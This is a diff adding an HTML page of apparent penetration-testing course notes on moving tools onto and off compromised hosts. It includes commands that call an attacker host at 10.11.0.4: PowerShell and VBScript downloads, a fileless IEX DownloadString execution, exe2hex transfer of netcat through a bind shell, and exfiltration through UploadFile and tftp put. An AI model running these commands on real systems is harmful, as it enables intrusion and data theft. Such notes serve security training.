@@ -1,0 +1,63 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>File transfers</title>
+</head><body>Dangers of transferring attack tools:<ul><li style="list-style-type: none">Post-exploitation attack tools may be abused by malicious third parties</li>
+<li style="list-style-type: none">Anti-virus software scans for pre-define file signatures on endpoint hosts and can generate huge frustration in these phase</li>
+<li style="list-style-type: none">We should always try to use native tools on the compromise system</li>
+<li style="list-style-type: none">We can upload our tools when we think that native tools on the victim machine are insufficient</li>
+</ul>
+Pure-FTPd<ul><li style="list-style-type: none">Installing Pure-FTPd on the kali attacker machine: sudo apt-get update &amp;&amp; sudo apt-get install pure-ftpd</li>
+<li style="list-style-type: none">Create the relevant group and user, configure folder permission and start the FTP server with the custom script: setup-ftp.sh</li>
+</ul>
+Interactive vs non-interactive shells:<ul><li style="list-style-type: none">Non-interactive shells (like for example nc bind and reverse shells) can be a problem when using services such as FTP, when the standard output of the service we interact with is not properly forwarded to the attacked by the shell and controll of the shell is lost.</li>
+<li style="list-style-type: none">We need to upgrade a non-interactive shell to a fully interactive shell with the python pty shell: python -c 'import pty; pty.spawn("/bin/bash")'</li>
+</ul>
+Transferring files with UNIX-like environments:<ul><li style="list-style-type: none">nc</li>
+<li style="list-style-type: none">curl</li>
+<li style="list-style-type: none">wget</li>
+</ul>
+Transferring files with Windows hosts:<ul><li style="list-style-type: none">Non-interactive FTP download: Windows ships with a default FTP client that can be used for file trasfers. To do this, we can instruct this Windows FTP client to download from our attacker Pure-FTPd server a simple text file containing all the FTP commands to execute sequentially to connect, download the intended file and close the connection</li>
+</ul>
+Windows downloads using scripting languages VBScript and PowerShell:<ul><li style="list-style-type: none">cscript wget.vbs http://10.11.0.4/wget.exe evil.exe</li>
+<li style="list-style-type: none">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</li>
+<li style="list-style-type: none">or as a 1-liner: powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe', 'evil3.exe')</li>
+<li style="list-style-type: none">or as variant WITHOUT writing anything to disk on the victim machine: </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">On the attacker machine we save the simple PowerShell script helloworld,ps1 (with content: Write-Output "Hello World")</li>
+<li style="list-style-type: none">On the victim machine: powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')</li>
+</ul>
+</li>
+</ul>
+Windows downloads with exe2hex and PowerShell:<ul><li style="list-style-type: none">On the attacker machine, we will compress our binary, convert it to HEX and create a Windows script. </li>
+<li style="list-style-type: none">On the Windows victim machine, we will paste the script into a shell and run it. It will redirect the HEX data into powershell.exe, which will asseble it back into a binary. This will be done thru a series of non-interactive commands:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">upx -9 nc.exe</li>
+<li style="list-style-type: none">exe2hex -x nc.exe -p nc.cmd</li>
+<li style="list-style-type: none">cat nc.cmd | xclip -selection clipboard</li>
+<li style="list-style-type: none">now we paste the script into our bind shell</li>
+<li style="list-style-type: none">at the end of the paste process, we will have reconstructed nc.exe on the victim"s machine</li>
+</ul>
+</li>
+</ul>
+Windows upload with Windows scripting languages (data exfiltration from our victim to our attacker machines):<ul><li style="list-style-type: none">We need to have a upload PHP script available in the Web root of the attacker machine: upload.php</li>
+<li style="list-style-type: none">create the uploads folder: sudo mkdir /var/www/uploads</li>
+<li style="list-style-type: none">assign proper priviledges (to note that this will allow anyone to upload a file to our attacker machine): sudo chown www-data: /var/www/uploads </li>
+<li style="list-style-type: none">and finally we exfiltrate the evil.exe from the victim to the attacke: powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'evil.exe')</li>
+</ul>
+Uploading files with TFTP client:<ul><li style="list-style-type: none">This can be used on older Windows systems, up to Windows XP and Windows 2003 (the TFTP client is not installed on Windows 7, Windows 2008 and newer)</li>
+<li style="list-style-type: none">We need to install TFTP on our attacker machine: sudo apt-get install atftp</li>
+<li style="list-style-type: none">Then, to create the transfer folder, configure it and launch it with the following commands: sudo mkdir /tftp &amp;&amp; sudo chown nobody: /tftp &amp;&amp; sudo atftpd --daemon --port 69 /tftp</li>
+<li style="list-style-type: none">Finally, on our Windows victim machine, we cna exfiltrate the evil2.exe file with the command: tftp -i 10.11.0.4 put evil2.exe</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
